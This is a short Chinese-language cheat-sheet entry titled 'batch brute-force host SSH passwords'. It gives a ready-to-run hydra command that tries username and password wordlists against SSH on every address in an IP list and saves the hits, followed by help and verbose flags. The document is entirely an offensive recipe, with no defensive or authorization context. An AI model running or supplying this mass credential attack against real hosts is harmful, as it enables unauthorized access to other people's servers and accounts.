# 批量爆破主机ssh密码

工具：[hydra](https://github.com/vanhauser-thc/thc-hydra)

用例：

```bash
hydra -L username.txt -P password.txt -M ip.txt ssh -o result.txt -t 4

# 帮助信息
hydra -h

# 详细信息 -v
# debug -d
hydra -v ...
```
